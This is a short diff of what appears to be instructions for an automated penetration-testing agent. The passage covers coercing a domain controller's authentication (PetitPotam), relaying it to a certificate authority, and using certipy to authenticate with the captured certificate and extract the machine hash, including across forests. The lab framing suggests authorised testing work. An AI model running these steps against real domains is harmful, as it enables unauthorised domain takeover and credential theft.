@@ -133,11 +133,12 @@ relay_and_coerce(
     coerce_target="dc01.contoso.local",  # MUST differ from ca_host
     attacker_ip="YOUR_IP",
     coerce_user="user",                  # Account to RPC the target machine
-    coerce_password="...",               # OR coerce_hash=":NTHASH"
     coerce_domain="user.realm",          # User's home realm
     template="DomainController"
 )
 ```
+-> Worker injects `coerce_password` or `coerce_hash` for `(coerce_user, coerce_domain)` from state — never pass them yourself.
+
 Cross-forest case: `coerce_user` lives in the child realm; `coerce_target` is the parent DC (or another parent-realm machine). The captured cert is for that machine's account — `certipy_auth` will PKINIT into the parent realm and extract the hash. **Try unauth first — most lab DCs are unpatched against PetitPotam.**
 
 **Fallback (only if `relay_and_coerce` is unavailable):**
